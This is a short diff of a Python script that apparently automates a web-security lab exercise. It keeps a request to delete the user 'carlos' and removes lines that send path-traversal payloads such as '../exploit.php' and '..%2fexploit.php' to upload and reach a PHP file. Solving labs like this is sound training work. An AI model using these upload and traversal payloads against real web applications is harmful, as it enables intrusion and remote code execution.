@@ -73,26 +73,5 @@ async def main():
     print(f'Delete carlos:', end='')
     await print_net_result(raw_req_2, False)
 
-
-    return
-
-    # Original get
-    raw_req_1 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", "/files/avatars/exploit.php")
-    print('PLAIN GET:', end='')
-    await print_net_result(raw_req_1, True)
-
-
-    raw_req_7 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "../exploit.php")
-    print('path-traversal POST:', end='')
-    await print_net_result(raw_req_7, True)
-
-    raw_req_9 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "..%2fexploit.php")
-    print('path-traversal POST with encoding:', end='')
-    await print_net_result(raw_req_9, True)
-
-    raw_req_12 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", "/files/avatars/../exploit.php")
-    print('path-traversal GET with encoding:', end='')
-    await print_net_result(raw_req_12, True)
-
 if __name__ == "__main__":
     asyncio.run(main())
